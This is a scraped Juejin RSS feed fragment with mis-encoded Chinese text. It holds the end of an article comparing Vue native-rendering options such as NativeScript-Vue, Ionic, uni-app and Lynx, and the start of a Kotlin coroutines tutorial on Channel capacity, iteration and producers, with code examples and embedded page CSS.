<table><thead><tr><th align="left">è·¯çº¿</th><th align="left">æ¸²æŸ“æ–¹å¼</th><th align="left">æ€§èƒ½</th><th align="left">å¼€å‘ä½“éªŒ</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>NativeScript-Vue 3</strong></td><td align="left">åŸç”Ÿæ§ä»¶</td><td align="left">â˜…â˜…â˜…â˜…</td><td align="left">Vite + Tailwindï¼Œæˆç†Ÿ</td><td align="left">è¿½æ±‚100%åŸç”ŸUIï¼Œæ— éœ€WebView</td></tr><tr><td align="left"><strong>Ionic Vue + Capacitor</strong></td><td align="left">WebView</td><td align="left">â˜…â˜…â˜…</td><td align="left">æœ€æ¥è¿‘Webå¼€å‘ï¼ŒPWAå‹å¥½</td><td align="left">ä¸€å¥—ä»£ç è¦†ç›–Web/Appï¼Œé‡å¼€å‘æ•ˆç‡</td></tr><tr><td align="left"><strong>uni-app / uni-appx</strong></td><td align="left">WebView â†’ åŸç”Ÿæ¸²æŸ“</td><td align="left">â˜…â˜…â˜…â˜†</td><td align="left">ä¸­æ–‡ç”Ÿæ€å®Œå–„ï¼Œå·¥å…·é“¾å¼º</td><td align="left">éœ€åŒæ—¶å‘å¸ƒå›½å†…å¤šç«¯ï¼ˆå°ç¨‹åº+Appï¼‰</td></tr><tr><td align="left"><strong>Vue + Lynx</strong></td><td align="left"><strong>åŒçº¿ç¨‹åŸç”Ÿ</strong></td><td align="left">â˜…â˜…â˜…â˜…â˜†</td><td align="left">æ—©æœŸï¼Œéœ€é…ç½®ï¼Œæ½œåŠ›å¤§</td><td align="left"><strong>è¿½æ±‚æè‡´æ€§èƒ½ï¼Œæ„¿å‚ä¸ç”Ÿæ€å…±å»º</strong></td></tr></tbody></table>
<p><strong>ç®€å•å†³ç­–å‚è€ƒ</strong>ï¼š</p>
<ul>
<li><strong>â€œæˆ‘ç°åœ¨å°±è¦ç”¨â€</strong> â†’ é€‰æ‹© NativeScript-Vue æˆ– uni-appã€‚</li>
<li><strong>â€œæˆ‘è¦æœ€åƒWebçš„å¼€å‘ä½“éªŒâ€</strong> â†’ é€‰æ‹© Ionic Vueã€‚</li>
<li><strong>â€œæˆ‘çœ‹é‡æœªæ¥æ€§èƒ½å’Œå‰æ²¿æŠ€æœ¯â€</strong> â†’ å¯†åˆ‡å…³æ³¨å¹¶å°è¯•å‚ä¸ <strong>Vue + Lynx</strong>ã€‚</li>
</ul>
<h4 data-id="heading-8">å…«ã€ç»“è¯­ï¼šè¿™ä¸€æ¬¡ï¼Œä¸å†ç¼ºå¸­ï¼Ÿ</h4>
<p>Vueç¤¾åŒºå¯¹â€œåŸç”Ÿæ¸²æŸ“â€çš„æœŸå¾…ç”±æ¥å·²ä¹…ã€‚å¦‚ä»Šï¼Œå¤šæ¡æŠ€æœ¯è·¯å¾„æ­£åœ¨å¹¶è¡Œå‘å±•ï¼š</p>
<ul>
<li><strong>NativeScript-Vue 3</strong> å·²è¶‹æˆç†Ÿã€‚</li>
<li><strong>uni-appx</strong> æŒç»­æ‹“å±•å¤šç«¯èƒ½åŠ›ã€‚</li>
<li>è€Œæœ€å…·é¢ è¦†æ€§çš„ <strong>Vue + Lynx</strong> è·¯å¾„ï¼Œæ­£ä»¥å¼€æºå…±å»ºçš„æ¨¡å¼å¸å¼•å¼€å‘è€…ã€‚</li>
</ul>
<p>æˆ–è®¸åœ¨ä¸ä¹…çš„å°†æ¥ï¼Œæˆ‘ä»¬åªéœ€ä¸€æ¡å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm create vue-native@latest
</code></pre>
<p>ä¾¿å¯ä»å¤šä¸ªç”Ÿäº§å°±ç»ªçš„VueåŸç”Ÿæ¸²æŸ“æ¨¡æ¿ä¸­ä»»é€‰å…¶ä¸€ã€‚</p>
<p><strong>Weexæ—¶ä»£çš„é—æ†¾ï¼Œæˆ–è®¸çœŸçš„èƒ½åœ¨2025å¹´è¢«å½»åº•å¡«è¡¥ã€‚Vue Nativeï¼Œè¿™ä¸€æ¬¡å¯èƒ½çœŸçš„è¦å¯åŠ¨äº†ã€‚</strong></p>
<blockquote>
<p><strong>ä¿æŒå…³æ³¨</strong>ï¼š</p>
<ul>
<li>Lynx é¡¹ç›®ï¼š<code>github.com/lynx-family/lynx</code></li>
<li>ç”Ÿæ€åŠ¨æ€ï¼šå¯å…³æ³¨ <code>@Huxpro</code> ç­‰æ ¸å¿ƒå¼€å‘è€…çš„æœ€æ–°æ¶ˆæ¯ã€‚</li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlinåç¨‹-çƒ­æ•°æ®é€šé“Channel]]></title>    <link>https://juejin.cn/post/7590159073988624436</link>    <guid>https://juejin.cn/post/7590159073988624436</guid>    <pubDate>2026-01-02T10:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590159073988624436" data-draft-id="7590104561475878964" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlinåç¨‹-çƒ­æ•°æ®é€šé“Channel"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2026-01-02T10:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Huangå…„"/> <meta itemprop="url" content="https://juejin.cn/user/52404619842712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlinåç¨‹-çƒ­æ•°æ®é€šé“Channel
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/52404619842712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Huangå…„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T10:55:50.000Z" title="Fri Jan 02 2026 10:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>ç§ä¸€é¢—æ ‘çš„æœ€å¥½æ—¶æœºæ˜¯åå¹´å‰ï¼Œå…¶æ¬¡æ˜¯ç°åœ¨ã€‚
å­¦ä¹ ä¹Ÿä¸€æ ·ã€‚
è·Ÿç€éœè€å¸ˆçš„ã€Šæ·±å…¥ç†è§£ Kotlin æºç¨‹ã€‹å­¦ä¹ ä¸€ä¸‹åç¨‹ã€‚</p>
<h2 data-id="heading-0">ç›´å¥”ä¸»é¢˜ï¼Œè®¤è¯† Channel</h2>
<p>Channel å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—ï¼Œå®ƒå¯ä»¥ç”¨æ¥è¿æ¥åç¨‹ï¼Œå®ç°ä¸åŒåç¨‹çš„é€šä¿¡</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> channel = Channel&lt;<span class="hljs-built_in">Int</span>&gt;()
    <span class="hljs-keyword">val</span> producer = GlobalScope.launch {
        <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            delay(<span class="hljs-number">1000</span>)
            channel.send(i++)
        }
    }
    <span class="hljs-keyword">val</span> consumer = GlobalScope.launch {
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">val</span> element = channel.receive()
            println(element)
        }
    }
    producer.join()
    consumer.join()
}
</code></pre>
<p>ä¸Šè¿°çš„ä»£ç ä¸­æ„é€ äº†ä¸¤ä¸ªåç¨‹ producer å’Œ consumerï¼Œæˆ‘ä¹ˆå‘¢æ²¡æœ‰ä¸ºå®ƒä»¬æ˜ç¡®åˆ¶å®šè°ƒåº¦å™¨ï¼Œæ‰€ä»¥ä»–ä»¬çš„è°ƒåº¦å™¨éƒ½æ˜¯é»˜è®¤çš„ã€‚å…¶ä¸­ producer ä¸­æ¯éš” 1 ç§’å‘ Channel å‘é€ä¸€ä¸ªæ•´æ•°ï¼Œè€Œ consumer ä¸­ä¸€è‡´åœ¨è¯»å– channel æ¥è·å–æ•°æ®å¹¶æ‰“å°ï¼Œæ˜¾ç„¶å‘é€ç«¯æ¯”æ¥æ”¶ç«¯æ›´æ…¢ï¼Œåœ¨æ²¡æœ‰å¯ä»¥è¯»å–çš„å€¼æ—¶ï¼Œreceive æ˜¯æŒ‚èµ·çš„ï¼Œç›´åˆ°æœ‰æ–°å…ƒç´ åˆ°è¾¾ï¼Œè¿™ä¹ˆçœ‹æ¥ receive ä¸€å®šæ˜¯ä¸€ä¸ªæŒ‚èµ·å‡½æ•°ï¼Œé‚£ä¹ˆ send å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">Channel çš„å®¹é‡</h2>
<p>æˆ‘ä»¬æŸ¥çœ‹ send æ–¹æ³•çš„å£°æ˜ï¼Œå‘ç°å®ƒä¹Ÿæ˜¯æŒ‚èµ·å‡½æ•°ã€‚é‚£ä¹ˆå‘é€ç«¯ä¸ºä»€ä¹ˆè¦æŒ‚èµ·ï¼Ÿä¸Šé¢ä¹Ÿæåˆ°ï¼ŒChannel å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­ä¸€å®šå­˜åœ¨ç¼“å†²åŒºï¼Œä¸€æ—¦è¿™ä¸ªç¼“å†²åŒºæ»¡äº†ï¼Œä¸€ç›´æ²¡æœ‰äººè°ƒç”¨ receive å¹¶å–èµ°å…ƒç´ ï¼Œsend å°±è¦æŒ‚èµ·ï¼Œç­‰å¾…æ¥æ”¶è€…å–èµ°å…ƒç´ åå†å†™å…¥ Channelã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;E&gt;</span> <span class="hljs-title">Channel</span><span class="hljs-params">(capacity: <span class="hljs-type">Int</span> = RENDEZVOUS)</span></span>: Channel&lt;E&gt; =
    <span class="hljs-keyword">when</span> (capacity) {
        RENDEZVOUS -&gt; RendezvousChannel()
        UNLIMITED -&gt; LinkedListChannel()
        CONFLATED -&gt; ConflatedChannel()
        BUFFERED -&gt; ArrayChannel(CHANNEL_DEFAULT_CAPACITY)
        <span class="hljs-keyword">else</span> -&gt; ArrayChannel(capacity)
    }
</code></pre>
<p>æˆ‘ä»¬æ„é€  Cahnnel çš„æ—¶å€™è°ƒç”¨äº†ä¸€ä¸ªåä¸º Channle çš„å‡½æ•°ï¼Œä½†å®ƒä¸æ˜¯ Channel çš„æ„é€ å‡½æ•°ã€‚åœ¨ Kotlin ä¸­ï¼Œç»å¸¸å®šä¹‰ä¸€ä¸ªé¡¶çº§å‡½æ•°æ¥ä¼ªè£…æˆåŒåç±»å‹çš„æ„é€ å™¨ï¼Œè¿™æœ¬è´¨ä¸Šæ˜¯å·¥å‚å‡½æ•°ã€‚è¿™é‡Œæœ‰ä¸€ä¸ª Int ç±»å‹çš„ capacity å‚æ•°ï¼Œé»˜è®¤å€¼ä¸º RENDEZVOUSã€‚
è¿™æ—¶å€™å¦‚æœä¸è°ƒç”¨ receiveï¼Œsend å°±ä¼šä¸€ç›´æŒ‚èµ·ç­‰å¾…ã€‚</p>
<p><code>UNLIMITED</code>æ¯”è¾ƒå¥½ç†è§£ï¼Œæ²¡æœ‰é™åˆ¶ï¼Œæ¥è€…ä¸æ‹’ã€‚
<code>CONFLATED</code>è¿™ä¸ªåå­—å¯èƒ½æœ‰è¿·æƒ‘æ€§ï¼Œå­—é¢æ„æ€æ˜¯åˆå¹¶ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªå‡½æ•°çš„æ•ˆæœæ˜¯åªä¿ç•™æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯è¯´ç¼“å†²åŒºåªæœ‰ä¸€ä¸ªå…ƒç´ å¤§å°ï¼Œæ¯æ¬¡æœ‰æ–°å…ƒç´ åˆ°æ¥ï¼Œéƒ½ä¼šè¦†ç›–æ‰æ—§å…ƒç´ ã€‚
<code>BUFFERED</code>æ•ˆæœç±»ä¼¼äº ArrayBlockingQueueï¼Œæ¥æ”¶ä¸€ä¸ªå€¼ä½œä¸ºç¼“å†²åŒºå®¹é‡å¤§å°ã€‚</p>
<h3 data-id="heading-2">è¿­ä»£ Channel</h3>
<p>æˆ‘ä»¬åœ¨å‘é€å’Œè¯»å–çš„æ—¶å€™å†™äº†ä¸€ä¸ª<code>while(true)</code>çš„æ­»å¾ªç¯ï¼Œå› ä¸ºéœ€è¦ä¸æ–­åœ°è¿›è¡Œè¯»å†™æ“ä½œã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·å–ä¸€ä¸ª Channel çš„ Iterator</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-keyword">val</span> consumer = GlobalScope.launch {
        <span class="hljs-keyword">val</span> iter = channel.iterator()
        <span class="hljs-keyword">while</span> (iter.hasNext()) {
            <span class="hljs-keyword">val</span> element = iter.next()
            println(element)
            delay(<span class="hljs-number">1000</span>)
        }
    }
</code></pre>
<p>å…¶ä¸­ iter.hasNext()æ˜¯æŒ‚èµ·å‡½æ•°ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™å°±éœ€è¦å» Channel ä¸­è¯»å–å…ƒç´ äº†ã€‚å½“ç„¶ä¹Ÿå¯ä»¥<code>for ... in ..</code>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-keyword">val</span> consumer = GlobalScope.launch {
        <span class="hljs-keyword">for</span>(element <span class="hljs-keyword">in</span> channel) {
            println(element)
            delay(<span class="hljs-number">1000</span>)
        }
    }
</code></pre>
<h3 data-id="heading-3">produce å’Œ actor</h3>
<p>æ¥çœ‹ä¸¤ä¸ªä¾¿æ·çš„æ„é€ ç”Ÿäº§è€…å’Œæ¶ˆè´¹è¿™çš„ apiï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>produce</code>æ¥å¯åŠ¨ç§»åŠ¨ç”Ÿäº§è€…åç¨‹ï¼Œå¹¶è¿”å›ä¸€ä¸ª<code>ReceiveChannel</code>,å…¶ä»–åç¨‹å°±å¯ä»¥é€šè¿‡è¿™ä¸ª channel æ¥è·å–æ•°æ®äº†ã€‚<br/>
